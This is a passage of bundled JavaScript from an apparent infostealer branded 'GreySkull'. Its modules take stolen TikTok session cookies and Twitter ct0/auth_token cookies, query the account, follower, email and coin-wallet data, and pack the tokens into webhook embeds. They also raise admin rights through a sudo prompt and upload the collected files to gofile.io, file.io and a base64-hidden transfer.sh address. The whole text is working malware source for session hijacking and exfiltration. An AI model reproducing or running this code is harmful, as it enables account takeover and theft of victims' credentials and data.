          "https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE",\r
          {\r
            headers: {\r
              cookie: `sessionid=${tiktok}`,\r
              "Accept-Encoding": "identity",\r
            },\r
          }\r
        )\r
        .then((res) => res.data)\r
        .catch(() => {});\r
\r
      const insights = await axios\r
        .post(\r
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",\r
          'type_requests=[{"insigh_type":"vv_history","days":16},{"insigh_type":"pv_history","days":16},{"insigh_type":"like_history","days":16},{"insigh_type":"comment_history","days":16},{"insigh_type":"share_history","days":16},{"insigh_type":"user_info"},{"insigh_type":"follower_num_history","days":17},{"insigh_type":"follower_num"},{"insigh_type":"week_new_videos","days":7},{"insigh_type":"week_incr_video_num"},{"insigh_type":"self_rooms","days":28},{"insigh_type":"user_live_cnt_history","days":58},{"insigh_type":"room_info"}]',\r
          {\r
            headers: {\r
              cookie: `sessionid=${tiktok}`,\r
            },\r
          }\r
        )\r
        .then((res) => res.data)\r
        .catch(() => {});\r
\r
      const wallet = await axios\r
        .get(\r
          "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",\r
          {\r
            headers: {\r
              cookie: `sessionid=${tiktok}`,\r
            },\r
          }\r
        )\r
        .then((res) => res.data)\r
        .catch(() => {});\r
\r
      if (!profile || !profile.data) return;\r
      let { username, email } = profile.data;\r
      let { follower_num } = insights;\r
      let { coins } = wallet.data;\r
\r
      let fdp = `Account: ${username}\r
email: ${email ?? "none"}\r
follower_num: ${follower_num}\r
coins: ${coins ?? 0}`;\r
      try {\r
        if (!fs.existsSync(socialDir)) {\r
          fs.mkdirSync(socialDir);\r
        }\r
        if (!fs.existsSync(TiktokDir)) {\r
          fs.mkdirSync(TiktokDir);\r
        }\r
      } catch (e) {}\r
      try {\r
        const tiktokFilePath = path.join(TiktokDir, "TikTok.txt");\r
        fs.writeFileSync(tiktokFilePath, fdp);\r
      } catch (e) {}\r
      let embed = {\r
        title: "Tiktok Session",\r
        fields: [\r
          {\r
            name: `${embeds.tiktok} Username:`,\r
            value: `[\`${username}\`](https://instagram.com/${username})`,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.twitter_followers} Followers:`,\r
            value: `\`${follower_num.value ?? 0}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.mail} Email`,\r
            value: `\`${email ?? "None"}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${embeds.token} Coins`,\r
            value: `\`${coins ?? 0}\``,\r
            inline: true,\r
          },\r
          {\r
            name: `${stats.cookie} Token`,\r
            value: `\`\`\`${tiktok}\`\`\``,\r
            inline: false,\r
          },\r
        ],\r
        footer: {\r
          text: "@GreySkull | https://t.me/Sordeal",\r
        },\r
        color: 3553599,\r
      };\r
      g.push(embed);\r
    }\r
\r
    let tosend = {\r
      avatar_url:\r
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",\r
      username: "GreySkull",\r
      embeds: g,\r
    };\r
    return tosend;\r
  }\r
}\r
module.exports = {\r
  ParseTiktok,\r
};\r


//# sourceURL=webpack://script/./utils/tiktok.js?");

/***/ }),

/***/ 
})(module_21_exports, module_21_exports);
modules['module_21'] = module_21_exports;

// Módulo 22
const module_22_exports = {};
(function(module, exports) {
const { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),\r
  fs = __webpack_require__(/*! fs */ "fs"),\r
  axios = __webpack_require__(/*! axios */ "axios"),\r
  path = __webpack_require__(/*! path */ "path"),\r
  { embeds } = __webpack_require__(/*! ./emotes */ "./utils/emotes.js");\r
\r
\r
  \r
async function detailtwitter(tw) {\r
  if (tw != "yes") return;\r
  const cooks = stat.twitter_cookies;\r
  if (!cooks) return;\r
  if (cooks.length < 12) return;\r
  try {\r
    const { value: ct0 } = cooks.find((cookie) => cookie.name === "ct0");\r
    const { value: authToken, source } = (await cooks).find(\r
      (cookie) => cookie.name === "auth_token"\r
    );\r
    const { data: profile } = await axios.post(\r
      "https://twitter.com/i/api/1.1/account/update_profile.json",\r
      {},\r
      {\r
        headers: {\r
          Cookie: `ct0=${ct0}; auth_token=${authToken}`,\r
          Host: "twitter.com",\r
          "User-Agent":\r
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",\r
          Accept: "*/*",\r
          "Accept-Language": "fr-FR",\r
          "Accept-Encoding": "gzip, deflate, br",\r
          Prefer: "safe",\r
          authorization:\r
            "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",\r
          "x-twitter-auth-type": "OAuth2Session",\r
          "x-csrf-token": ct0,\r
          "x-twitter-client-language": "en",\r
          "x-twitter-active-user": "yes",\r
          Origin: "https://twitter.com",\r
          Connection: "keep-alive",\r
          Referer: "https://twitter.com/",\r
          "Sec-Fetch-Dest": "empty",\r
          "Sec-Fetch-Mode": "cors",\r
          "Sec-Fetch-Site": "same-site",\r
        },\r
      }\r
    );\r
    profile.cookie = ct0;\r
    profile.source = source;\r
    stat.AddTwitterAccount(profile);\r
    const basepath = stat.testpath[0];\r
    const socialDir = path.join(basepath, "Social");\r
    const twitterDir = path.join(socialDir, "Twitter");\r
    try {\r
      if (!fs.existsSync(socialDir)) {\r
        fs.mkdirSync(socialDir);\r
      }\r
      if (!fs.existsSync(twitterDir)) {\r
        fs.mkdirSync(twitterDir);\r
      }\r
    } catch (e) {\r
    }\r
    const twitterFilePath = path.join(twitterDir, "Twitter.json");\r
    fs.writeFileSync(twitterFilePath, JSON.stringify(profile));\r
  } catch (e) {}\r
}\r
\r
function sendTwitter(tw) {\r
  if (tw !== "yes") return;\r
  if (stat.twitter_account[0]) {\r
    let {\r
      screen_name,\r
      name,\r
      location,\r
      profile_location,\r
      description,\r
      created_at,\r
      followers_count,\r
      favourites_count,\r
      cookie,\r
      profile_image_url,\r
      profile_banner_url,\r
      profile_text_color,\r
      friends_count,\r
      verified,\r
    } = stat.twitter_account[0];\r
    const handleNullValue = (value) => value ?? "none";\r
    let embed = {\r
      avatar_url:\r
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",\r
      username: "GreySkull",\r
      embeds: [\r
        {\r
          color: 3553599,\r
          thumbnail: {\r
            url: profile_image_url.replace("normal", "bigger"),\r
          },\r
          image: {\r
            url: profile_banner_url,\r
          },\r
          fields: [\r
            {\r
              name: verified\r
                ? `${embeds.twitter_usernamecert} Username:`\r
                : `${embeds.twitter_usernameuncert} Username:`,\r
              value: `\`${handleNullValue(name)}\``,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.twitter_followers} Followers:`,\r
              value: `\`${handleNullValue(followers_count)}\``,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.twitter_followings} Following:`,\r
              value: `\`${handleNullValue(friends_count)}\``,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.twitter_fav} Favourites:`,\r
              value: `\`${handleNullValue(favourites_count)}\``,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.mail} User:`,\r
              value: `[\`${handleNullValue(\r
                screen_name\r
              )}\`](https://twitter.com/${screen_name})`,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.twitter_location} Location:`,\r
              value: `[${handleNullValue(\r
                profile_location\r
              )}](https://www.google.com/maps/place/France/${location})`,\r
              inline: true,\r
            },\r
            {\r
              name: `${embeds.mail}  Description:`,\r
              value: `\`${handleNullValue(description)}\``,\r
              inline: false,\r
            },\r
            {\r
              name: `🍪 Cookie:`,\r
              value: `\`${handleNullValue(cookie)}\``,\r
              inline: false,\r
            },\r
          ],\r
          footer: {\r
            text: "Creation Date: " + handleNullValue(created_at),\r
          },\r
          title: "Twitter Account",\r
          url: `https://twitter.com/${screen_name}`,\r
        },\r
      ],\r
    };\r
    if (embed) {\r
      return embed;\r
    } else {\r
      return null;\r
    }\r
  }\r
}\r
\r
module.exports = {\r
  detailtwitter,\r
  sendTwitter,\r
};\r


//# sourceURL=webpack://script/./utils/twitter.js?");

/***/ }),

/***/ 
})(module_22_exports, module_22_exports);
modules['module_22'] = module_22_exports;

// Módulo 23
const module_23_exports = {};
(function(module, exports) {
const path = __webpack_require__(/*! path */ "path"),\r
 sudo = __webpack_require__(/*! sudo-prompt */ "sudo-prompt"),\r
 admin = __webpack_require__(/*! admin-check */ "admin-check");\r
\r
\r
function requestAdminPrivileges(myself) {\r
  return new Promise((resolve, reject) => {\r
\r
    sudo.exec(`${process.execPath} "${path.join(myself)}" --admin`, (error) => {\r
      if (error) {\r
      } else {\r
        process.abort()\r
      }\r
    });\r
  });\r
}\r
\r
\r
async function requestAdminPrivilegesIfNeeded(myself, cc, cc2, cc3) {\r
  if (cc === "yes" || cc2 === "yes" || cc3 === "yes") {\r
    let g = await admin.check()\r
    if (!g) {\r
      try {\r
        await requestAdminPrivileges(myself);\r
      } catch (error) {\r
      }\r
    }\r
  }\r
}\r
\r
\r
\r
module.exports = {\r
  requestAdminPrivilegesIfNeeded,\r
};\r


//# sourceURL=webpack://script/./utils/uac.js?");

/***/ }),

/***/ 
})(module_23_exports, module_23_exports);
modules['module_23'] = module_23_exports;

// Módulo 24
const module_24_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs");
const FormData = __webpack_require__(/*! form-data */ "form-data");
const axios = __webpack_require__(/*! axios */ "axios");


async function upload(path) { 
  let link;
  try {
    const server = await FoundSrv();
    if(server !== null){
    link = await uploadFile(path, server);
    if(!link){
      link = await uploadTransfer(path);
      if(!link){
        link = await uploadToFileio(path);
        return link;
      }
    }
    return link;
    }else{
      link = await uploadTransfer(path);
      if(!link){
        link = await uploadToFileio(path);
        return link;
      }
      return link;
    }
  } catch (e) {
    if (e) {
      const link = await uploadTransfer(path);
      return link;
    }
  }
}

async function uploadToFileio(filePath) {
  const data = new FormData();
  data.append("file", fs.createReadStream(filePath));
  try {
    const response = await axios.post("https://file.io/", data, {
      headers: {
        ...data.getHeaders(),
      },

    });
    return response.data.link ?? null;
  } catch (error) {
    return null
  }
}
async function FoundSrv() {
  const res = await axios({
    url: `https://api.gofile.io/getServer`,
    method: "GET",
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;",
      "cache-control": "no-cache",
      pragma: "no-cache",
      referrer: "https://gofile.io/uploadFiles",
      mode: "cors",
      "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
      dnt: 1,
      origin: "https://gofile.io",
    },
  });

  if (res.data.status !== "ok") {
    return null;
  }

  return res.data.data.server;
}

async function uploadFile(path, server) {
  const formData = new FormData();
  formData.append("file", fs.createReadStream(path));

  const res = await axios({
    url: `https://${server}.gofile.io/uploadFile`,
    method: "POST",
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;",
      "cache-control": "no-cache",
      pragma: "no-cache",
      referrer: "https://gofile.io/uploadFiles",
      mode: "cors",
      "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
      dnt: 1,
      origin: "https://gofile.io",
      ...formData.getHeaders(),
    },
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    referrer: "https://gofile.io/uploadFiles",
    data: formData,
  });

  if (res.data.status !== "ok") {
  }

  return res.data.data.downloadPage;
}


async function uploadTransfer(path) {
  const FileData = new FormData();
  FileData.append("file", fs.createReadStream(path));

  try {
    let g = Buffer.from(
      "aHR0cHM6Ly90cmFuc2Zlci5zaA==",
      "base64"
    ).toString();
    const res = await axios.post(g, FileData, {
      headers: {
        ...FileData.getHeaders(),
      },
    });

    if (res.status === 200 && res.data) {
      const downloadUrl = res.data.trim();
      return downloadUrl;
    } else {
    }
  } catch (error) {
  }
}


module.exports = {
  upload,
};


//# sourceURL=webpack://script/./utils/uploadFiles.js?");

/***/ }),

/***/ 
})(module_24_exports, module_24_exports);
modules['module_24'] = module_24_exports;
